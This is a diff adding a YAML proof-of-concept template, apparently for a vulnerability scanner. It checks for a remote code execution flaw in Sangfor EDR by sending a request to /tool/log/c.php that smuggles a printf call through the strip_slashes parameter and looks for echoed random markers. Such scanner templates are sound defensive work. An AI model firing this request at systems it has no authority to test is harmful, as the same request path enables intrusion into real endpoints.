@@ -1,0 +1,23 @@
+id: poc-yaml-sangfor-edr-tool-rce
+info:
+  name: Sangfor Edr Tool 远程代码执行漏洞
+  severity: medium
+  tags:
+  - rce
+  finger: Sangfor EDR
+  reference: []
+  description: null
+variables:
+  r1: random_str(8)
+  r2: random_str(8)
+transport: http
+requests:
+- method: GET
+  path: /tool/log/c.php?strip_slashes=printf&host={{.r1}}%25%25{{.r2}}
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, r1 + "%" + r2)
+  output: []
